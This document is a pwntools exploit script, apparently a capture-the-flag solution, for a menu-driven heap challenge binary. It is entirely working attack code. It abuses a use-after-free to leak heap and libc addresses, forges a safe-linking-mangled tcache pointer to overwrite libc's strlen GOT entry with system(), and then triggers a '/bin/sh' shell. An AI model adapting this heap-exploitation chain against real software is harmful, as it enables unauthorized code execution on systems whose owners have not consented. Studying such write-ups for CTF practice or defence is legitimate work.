from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(index, size):
    p_sla(b"choice: ", b"1")
    p_sla(b"Index: ", f"{index}".encode())
    p_sla(b"Size: ", f"{size}".encode())

def delete(index):
    p_sla(b"choice: ", b"2")
    p_sla(b"Index: ", f"{index}".encode())

def write_msg(index, size, data):
    p_sla(b"choice: ", b"3")
    p_sla(b"Index: ", f"{index}".encode())
    p_sla(b"Size: ", f"{size}".encode())
    p_s(data)

def print_msg(index):
    p_sla(b"choice: ", b"4")
    p_sla(b"Index: ", f"{index}".encode())

'''
scanf choice in main
read in write_msg
'''

script = '''
brva 0x14E9
brva 0x183F 
'''

p = process("./chall_patched")

add(0, 0x58)
add(1, 0x58)
add(2, 0x500)
add(3, 0x58)

delete(1)
delete(0)

print_msg(1)
p_recvut(b"Data: ")
heap_base = (u64(p.recv(5).ljust(8, b"\x00")) << 12)
print(hex(heap_base))

delete(2)
print_msg(2)
p_recvut(b"Data: ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
print(hex(libc_base))

strlen_got = libc_base + 0x21a098
mangled = (strlen_got - 0x18) ^ ((heap_base + 0x480) >> 12)
write_msg(0, 0x8, p64(mangled))

#debug()

add(4, 0x58)
add(5, 0x58)
system = libc_base + libc.symbols['system']
write_msg(5, 0x50, b"/bin/sh\x00".ljust(0x18, b"A") + p64(system))
print_msg(5)

p.interactive()